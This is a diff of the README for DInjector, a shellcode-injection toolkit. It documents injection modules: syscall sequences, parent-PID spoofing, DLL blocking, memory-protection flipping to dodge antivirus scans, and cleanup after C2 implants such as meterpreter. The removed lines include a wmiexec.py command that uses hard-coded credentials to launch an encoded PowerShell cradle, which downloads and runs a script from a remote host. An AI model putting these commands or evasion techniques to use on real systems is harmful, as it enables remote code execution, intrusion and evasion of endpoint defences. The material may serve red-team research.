@@ -108,12 +108,6 @@ references:
   - 'https://www.fergonez.net/post/shellcode-csharp'
 ```
 
-:information_source: When loading the cradle from a semi-interactive shell, use `Invoke-WmiMethod` to spawn a new PowerShell process. Example with [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py):
-
-```bash
-~$ wmiexec.py -silentcommand -nooutput administrator:'Passw0rd!'@192.168.1.11 "powershell -enc $(echo -n 'Invoke-WmiMethod Win32_Process -Name Create -ArgumentList ("powershell -enc '`echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`'")' | iconv -t UTF-16LE | base64 -w0)"
-```
-
 ### [FunctionPointerUnsafe](/DInjector/Modules/FunctionPointerUnsafe.cs)
 
 ```yaml
@@ -154,27 +148,35 @@ references:
 ```yaml
 module_name: 'currentthread'
 arguments: |
-  /timeout:10000
+  /protect:RX
+  /timeout:5000
+  /flipSleep:10000
 description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
 api:
   - dynamic_invocation:
-    1: 'WaitForSingleObject'
+    1: '[TIMEOUT] WaitForSingleObject'
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     3: 'NtCreateThreadEx'
-    4: '[IF] NtProtectVirtualMemory (oldProtect)'
-    5: '[IF] NtFreeVirtualMemory (shellcode)'
-    6: '[ELSE] NtWaitForSingleObject'
+    4: '[TIMEOUT] NtProtectVirtualMemory (oldProtect)'
+    5: '[TIMEOUT] NtFreeVirtualMemory (shellcode)'
+    6: 'NtWaitForSingleObject'
     7: 'NtClose'
 opsec_safe: false
 references:
   - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
 ```
 
-### [CurrentThreadUuid](/DInjector/Modules/CurrentThreadUuid.cs) (FOR SMALL-[SIZE](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) PAYLOADS)
+:information_source: Notes:
+
+* When using 3rd-party loader-independent encoders which require R**W**X memory to decode the shellcode (like [sgn](https://github.com/EgeBalci/sgn), available via `--sgn` switch in [`encrypt.py`](encrypt.py)), you can use the `/protect` option to set **RWX** (PAGE_EXECUTE_READWRITE, `0x40`) value. Default protection value for the memory region where the shellcode resides is **RX** (PAGE_EXECUTE_READ, `0x20`).
+* Some C2 implants (like meterpreter and [PoshC2](https://github.com/nettitude/PoshC2) but not Cobalt Strike, for example) allow to clean up the memory region where the initial shellcode was triggered from without terminating the active session. For that purpose the `/timeout` option exists: when its value is non-zero, the operator forces the `WaitForSingleObject` API call to time out initial shellcode execution in a specified number of milliseconds and then invoke the clean up routine to zero out the corresponding memory region and call `NtFreeVirtualMemory` on it.
+* If you want to set initial protection for the memory region where the shellcode as **NA** (PAGE_NOACCESS, `0x01`) to evade potential in-memory scan, use the `flipSleep` option to pause thread execution for a specified amount of milliseconds (same as in [RemoteThreadSuspended](#RemoteThreadSuspended)).
+
+### [CurrentThreadUuid](/DInjector/Modules/CurrentThreadUuid.cs)
 
 ```yaml
 module_name: 'currentthreaduuid'
@@ -192,6 +194,11 @@ references:
   - 'https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/'
   - 'https://github.com/ChoiSG/UuidShellcodeExec/blob/main/USEConsole/Program.cs'
 ```
+
+:information_source: Notes:
+
+* This technique is appliable for small-[size](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) payloads.
+* Use `--uuid` switch in [`encrypt.py`](encrypt.py) to format the shellcode for this technique.
 
 ### [RemoteThread](/DInjector/Modules/RemoteThread.cs)
 
@@ -267,6 +274,7 @@ references:
 module_name: 'remotethreadsuspended'
 arguments: |
   /pid:1337
+  /flipSleep:10000
 description: |
   Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
   After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
@@ -287,38 +295,51 @@ references:
   - 'https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs'
 ```
 
-### [RemoteThreadKernelCB](/DInjector/Modules/RemoteThreadKernelCB.cs) (UNSTABLE)
+### [RemoteThreadKernelCB](/DInjector/Modules/RemoteThreadKernelCB.cs)
 
 ```yaml
 module_name: 'remotethreadkernelcb'
 arguments: |
-  /pid:1337
+  /image:C:\Windows\System32\notepad.exe
+  /ppid:31337
+  /blockDlls:True
 description: |
-  Injects shellcode into an existing remote GUI process by spoofing the fnCOPYDATA value in KernelCallbackTable.
+  Injects shellcode into a newly spawned sacrifical remote process.
   Thread execution via SendMessageA.
 api:
   - dynamic_invocation:
-     1: 'FindWindowExA'
-     2: 'SendMessageA'
+     1: 'InitializeProcThreadAttributeList'
+     2: 'UpdateProcThreadAttribute (blockDLLs)'
+     3: 'UpdateProcThreadAttribute (PPID)'
+     4: 'CreateProcessA'
+     5: 'WaitForInputIdle'
+     6: 'FindWindowExA'
+     7: 'SendMessageA'
   - syscalls:
-     1: 'NtOpenProcess'
-     2: 'NtQueryInformationProcess'
-     3: 'NtReadVirtualMemory (kernelCallbackAddress)'
-     4: 'NtReadVirtualMemory (kernelCallbackValue)'
-     5: 'NtReadVirtualMemory (kernelStruct.fnCOPYDATA)'
-     6: 'NtProtectVirtualMemory (PAGE_READWRITE)'
-     7: 'NtWriteVirtualMemory (shellcode)'
-     8: 'NtProtectVirtualMemory (oldProtect)'
-     9: 'NtProtectVirtualMemory (PAGE_READWRITE)'
-    10: 'NtWriteVirtualMemory (origData)'
-    11: 'NtProtectVirtualMemory (oldProtect)'
-    12: 'NtClose (x2)'
+     1: 'NtQueryInformationProcess'
+     2: 'NtReadVirtualMemory (kernelCallbackAddress)'
+     3: 'NtReadVirtualMemory (kernelCallbackValue)'
+     4: 'NtReadVirtualMemory (kernelStruct.fnCOPYDATA)'
+     5: 'NtProtectVirtualMemory (PAGE_READWRITE)'
+     6: 'NtWriteVirtualMemory (shellcode)'
+     7: 'NtProtectVirtualMemory (oldProtect)'
+     8: 'NtProtectVirtualMemory (PAGE_READWRITE)'
+     9: 'NtWriteVirtualMemory (origData)'
+    10: 'NtProtectVirtualMemory (oldProtect)'
+    11: 'NtClose (x2)'
 opsec_safe:
 references:
   - 'https://t0rchwo0d.github.io/windows/Windows-Process-Injection-Technique-KernelCallbackTable/'
   - 'https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/'
   - 'https://gist.github.com/sbasu7241/5dd8c278762c6305b4b2009d44d60c13'
+  - 'https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html'
 ```
+
+:information_source: Notes:
+
+* This technique requires a GUI process (e.g., notepad.exe) to inject into.
+* Based on my testings a large payload (e.g., stageless meterpreter) will not work with this technique.
+* The sacrifical process will crash anyways when the shellcode finishes its work.
 
 ### [RemoteThreadAPC](/DInjector/Modules/RemoteThreadAPC.cs)
 
@@ -329,7 +350,7 @@ arguments: |
   /ppid:31337
   /blockDlls:True
 description: |
-  Injects shellcode into a newly spawned remote process.
+  Injects shellcode into a newly spawned sacrifical remote process.
   Thread execution via NtQueueApcThread.
 api:
   - dynamic_invocation:
@@ -351,6 +372,8 @@ references:
   - 'https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0'
 ```
 
+:information_source: If there're spaces in the image path which you specify within the `/image` option, you should replace them with asterisks (`*`). Example: `C:\Program Files\Mozilla Firefox\firefox.exe` → `C:\Program*Files\Mozilla*Firefox\firefox.exe`.
+
 ### [RemoteThreadContext](/DInjector/Modules/RemoteThreadAPC.cs)
 
 ```yaml
@@ -360,7 +383,7 @@ arguments: |
   /ppid:31337
   /blockDlls:True
 description: |
-  Injects shellcode into a newly spawned remote process.
+  Injects shellcode into a newly spawned sacrifical remote process.
   Thread execution via SetThreadContext.
 api:
   - dynamic_invocation:
@@ -392,7 +415,7 @@ arguments: |
   /ppid:31337
   /blockDlls:True
 description: |
-  Injects shellcode into a newly spawned remote process.
+  Injects shellcode into a newly spawned sacrifical remote process.
   Thread execution via NtResumeThread (hollowing with shellcode).
 api:
   - dynamic_invocation:
